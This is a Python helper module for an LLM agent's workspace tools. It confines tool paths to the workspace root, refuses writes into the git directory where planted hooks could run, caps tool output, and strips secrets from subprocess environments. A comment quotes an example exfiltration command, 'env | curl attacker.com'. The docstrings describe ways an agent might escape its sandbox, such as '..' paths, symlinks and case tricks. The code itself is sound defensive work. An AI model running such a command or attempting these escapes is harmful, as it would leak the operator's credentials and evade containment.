"""Helpers shared by every workspace tool.

Path resolution is the load-bearing concern: the agent supplies
relative paths in tool arguments, and we MUST keep them anchored
inside the workspace root regardless of ``..`` segments or absolute
prefixes. This is **advisory** -- the container / chroot is the real
sandbox boundary -- but it gives a clean :class:`BadRequestError` to
the LLM when it tries something obviously wrong.
"""

from __future__ import annotations

import os
from pathlib import Path

from primer.model.except_ import BadRequestError

#: How much of an unbounded source one tool result may retain (bytes).
#: Mirrors the outer tool-result truncation the agent runtime applies
#: (``primer/agent/tool_manager.py``: 2000 lines / 50 KiB), so a tool
#: that reads an unbounded source (an ``exec`` pipe, a file) keeps at
#: most what the runtime would have shown anyway -- and discards the
#: rest at the source instead of buffering it in the API process.
TOOL_RESULT_CAP_BYTES = 50 * 1024


def resolve_workspace_path(root: Path, rel: str) -> Path:
    """Resolve ``rel`` against ``root``; reject paths that escape.

    Returns the absolute path. The path doesn't have to exist; the
    caller decides what to do (read raises NotFoundError, write
    creates parents, etc.).
    """
    if not rel:
        raise BadRequestError("path must be non-empty")
    if "\x00" in rel:
        raise BadRequestError("path contains a null byte")
    root_resolved = root.resolve()
    candidate = (root_resolved / rel).resolve()
    try:
        candidate.relative_to(root_resolved)
    except ValueError as exc:
        raise BadRequestError(
            f"path resolves outside workspace: {rel!r}"
        ) from exc
    return candidate


def inside_git_dir(root: Path, git_dir_rel: str, target: Path) -> bool:
    """Whether ``target`` is the workspace's git-internals directory
    (``git_dir_rel``, root-relative; usually ``.state/.git``) or inside it.

    The reserved check the agent-facing ``write`` / ``edit`` tools
    apply: primer's own per-turn commit reads this directory, so a file
    planted there (a git hook, a clobbered config) is executed or parsed
    by the API process later. Compares against the REAL directory with
    :func:`os.path.samefile`, not a string prefix: on a case-insensitive
    filesystem (macOS APFS) ``.state/.GIT/...`` and ``.state/./.git/...``
    reach the same directory, and a symlink inside the workspace pointing
    into it must be refused too; walking ``target`` and every ancestor up
    to ``root`` covers all three. When the git directory does not exist
    yet (a fresh root), the resolved-path containment check answers for
    it.
    """
    git_dir = root / git_dir_rel
    try:
        target.resolve().relative_to(git_dir.resolve())
        return True
    except (ValueError, OSError):
        pass
    if not git_dir.is_dir():
        return False
    probe = target
    root_resolved = root.resolve()
    while probe != probe.parent:
        try:
            if probe.resolve().samefile(git_dir):
                return True
        except OSError:
            pass
        probe = probe.parent
        if probe == root_resolved:
            break
    return False


def workspace_relative(root: Path, absolute: Path) -> str | None:
    """Return ``absolute``, resolved, as a forward-slash path relative to ``root``;
    ``None`` when it resolves outside the root (a symlink or ``..`` leading out)."""
    try:
        return absolute.resolve().relative_to(root.resolve()).as_posix()
    except ValueError:
        return None


# Variables we copy from the parent process when constructing a
# subprocess environment. Anything outside this set (notably API keys,
# DB credentials, and other application secrets) is dropped so an LLM
# command like ``env | curl attacker.com`` cannot exfiltrate them.
_ENV_PASSTHROUGH = frozenset({
    "PATH",
    "HOME",
    "USER",
    "USERNAME",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "TZ",
    "TMPDIR",
    "TEMP",
    "TMP",
    "PWD",
    "SHELL",
    "TERM",
    # Windows-specific essentials.
    "SystemRoot",
    "SYSTEMROOT",
    "ComSpec",
    "COMSPEC",
    "PATHEXT",
    "WINDIR",
    "USERPROFILE",
    "APPDATA",
    "LOCALAPPDATA",
    "PROGRAMDATA",
    "PROGRAMFILES",
    "ProgramFiles",
    "ProgramFiles(x86)",
})


def _curated_subprocess_env() -> dict[str, str]:
    """Copy only the safelisted variables from the parent environment.

    Used by the agent-facing ``exec`` tool AND by primer's own git
    subprocesses (``primer/workspace/local/state.py``): a command or a
    planted git hook must never see the API process's credentials.
    """
    return {k: v for k, v in os.environ.items() if k in _ENV_PASSTHROUGH}


__all__ = [
    "TOOL_RESULT_CAP_BYTES",
    "_curated_subprocess_env",
    "inside_git_dir",
    "resolve_workspace_path",
    "workspace_relative",
]
